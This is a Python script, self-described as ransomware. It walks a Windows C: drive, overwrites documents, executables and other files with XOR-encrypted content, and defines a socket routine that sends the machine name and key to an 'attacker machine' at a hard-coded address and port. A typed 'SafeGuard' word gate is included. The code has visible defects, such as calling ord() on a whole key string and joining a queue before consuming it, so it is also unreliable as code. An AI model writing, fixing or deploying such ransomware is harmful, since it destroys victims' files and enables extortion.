#!/usr/bin/env python3.11
"""
 - Ransomware Script :
 .1. Encrypt Target Data .
 .2. Send Back Decryption Key Over Socket To Attacker Machine .
"""

from os import walk, path, environ
from contextlib import suppress
from random import choice
from socket import socket, AF_INET, SOCK_STREAM, error
from datetime import datetime
from threading import Thread
from queue import Queue


with suppress(KeyboardInterrupt, ValueError, TypeError, KeyError, error) as Error:

    def SAFEGUARD_Check():
        SAFEGUARD: str = input("SafeGuard: ")
        SAFEGUARD_POOL: tuple = ("attack", "start", "encrypt")
        if SAFEGUARD not in SAFEGUARD_POOL:
            print("NO SAFEGUARD")
            exit()

    def FileSearch() -> Queue:
        EXTENSIONS_POOL: tuple = (
            ".exe",
            ".txt",
            ".accdb",
            ".accdr",
            ".accdt",
            ".aspx",
            ".bat",
            ".bin",
            ".csv",
            ".dif",
            ".doc",
            ".docm",
            ".docx",
            ".dot",
            ".html",
            ".pdf",
            ".potx",
        )
        FILES_PATH: list = []
        for root, dirs, files in walk("C:\\"):
            for FILE in files:
                PATH, EXTENSION = path.splitext(root + "\\" + FILE)
                if EXTENSION in EXTENSIONS_POOL:
                    FILES_PATH.append(root + "\\" + PATH)
        FILES_QUEUE: Queue = Queue()
        for _FILE in FILES_PATH:
            FILES_QUEUE.put(_FILE)
        FILES_QUEUE.join()
        return FILES_QUEUE

    def ENCRYPTION() -> str:
        KEY_BITS: int = 2048 // 8
        CHARACTER_POOL: str = "".join(chr(CHAR_INDEX) for CHAR_INDEX in range(KEY_BITS))
        KEY: str = "".join(choice(CHARACTER_POOL) for _ in range(KEY_BITS))
        KEY_INDEX: int = 0
        MAX_KEY_INDEX: int = len(KEY) - 1
        FILE_QUEUE: Queue = FileSearch()
        while FILE_QUEUE.not_empty:
            File = FILE_QUEUE.get()
            try:
                with open(File, "rb") as RByteFile:
                    data = RByteFile.read()
                with open(File, 'wb') as WByteFile:
                    for byte in data:
                        Xor_Byte = byte ^ ord(KEY)
                        WByteFile.write(Xor_Byte.to_bytes(1, "little"))
                        if KEY_INDEX >= MAX_KEY_INDEX:
                            KEY_INDEX: int = 0
                        else:
                            KEY_INDEX += 1
            except Exception:
                print(f"Failed To Encrypt File {File}")
                continue
            FILE_QUEUE.task_done()

        return KEY

    def CLIENT_SOCKET() -> None:
        HOSTNAME: str = environ["COMPUTERNAME"]
        FORMAT: str = "utf-8"
        SERVER_ADDR: str = "192.168.100.4"
        SERVER_PORT_No: int = 5678
        ADDR: tuple = (SERVER_ADDR, SERVER_PORT_No)
        with socket(family=AF_INET, type=SOCK_STREAM) as CLIENT:
            CLIENT.connect(ADDR)
            CLIENT.send(f"[{datetime.now()}] - [{HOSTNAME}] - [{ENCRYPTION()}]".encode(FORMAT))
            if Error:
                CLIENT.close()
        CLIENT.close()
    for _ in range(30) :
        ENCRYPTION_THREAD: Thread = Thread(target=ENCRYPTION,daemon=True)
        ENCRYPTION_THREAD.start()
        ENCRYPTION_THREAD.join()
    if Error:
        print(f"ERROR {Error}")
